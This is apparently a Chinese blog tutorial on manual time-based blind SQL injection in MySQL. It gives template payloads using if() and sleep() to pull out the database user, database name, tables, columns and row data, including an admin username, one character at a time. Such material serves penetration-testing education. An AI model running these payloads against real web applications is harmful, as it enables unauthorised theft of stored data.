---
title: Mysql手工盲注(延时注入)
date: 2018-05-13 11:19:25
tags:
	- Mysql
	- 渗透测试
	- sql注入
	- hack
	- 盲注
categories: 渗透测试
---

Mysql手工盲注(延时注入)<!-- more -->

盲注的核心是靠 if 判断来注入
```
length(xxxxx) 函数是统计字符串的长度

mid(str,1,3) 、substr(str,1,1)字符串截取

ascii() 转换成ascii码

if (条件,True,False);

sleep(n)

```
## 判断基于时间的盲注
判断基于时间的盲注
```
and if(1=1,sleep(5),1)
and if(1=2,sleep(5),1)
if(条件,True返回内容,False返回内容)用来进行判断，sleep()延时函数，单位秒。
```
![](http://image.ixysec.com/image/sql/sql096.png)

如上图所示，当if判断为真时，则会延时5s(如果文件中通过localhost连接数据库会延时5+1=6秒)；而if判断为假时，则不延时。

## 猜解当前数据库用户名
第一步：猜解用户名的长度。(猜解到的用户名长度用于下面的逐位猜解用户名)
```
and if((select length(user()))=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql097.png)

第二步：逐位猜解用户名。
```
and if((select ascii(substr(user(),位数,1))=ascii码),sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql098.png)

## 猜解当前数据库名
第一步：猜解数据库名的长度。
```
and if((select length(database()))=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql099.png)

第二步：猜解数据库名。
```
and if((select ascii(substr(database(),位数,1))=ascii码),sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql100.png)

## 猜表名
第一步：判断表名的数量(以便逐个猜表名)
```
and if((select count(table_name) from information_schema.tables where table_schema=database())=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql101.png)

第二步：判断某个表名的长度(以便逐位猜表名的数据)
```
and if((select length(table_name) from information_schema.tables where table_schema=database() limit n,1)=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql102.png)

第三步：逐位猜表名
```
and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema=database() limit n,1)=ascii码,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql103.png)

## 猜列名
第一步：判断列名的数量(以便逐个猜列名)
```
and if((select count(column_name) from information_schema.columns where table_name='表名')=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql104.png)

第二步：判断某个列名的长度(以便逐位猜列名的数据)
```
and if((select length(column_name) from information_schema.columns where table_name='表名' limit n,1)=长度,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql105.png)

第三步：逐位猜列名
```
and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name='表名' limit n,1)=ascii码,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql106.png)

## 猜数据
第一步：判断数据的数量(以便逐个猜数据)
```
and if((select count(列名) from 表名)=个数,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql107.png)

第二步：判断某个数据的长度(以便逐位猜数据)
```
and if((select length(username) from admin limit 0,1)=5,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql108.png)

第三步：逐位猜数据
```
and if((select ascii(substr(username,1,1)) from admin limit 0,1)=97,sleep(5),0)
```
![](http://image.ixysec.com/image/sql/sql109.png)

**基于时间的盲注实质：**
```
if(布尔盲注语句,sleep(5),1)
```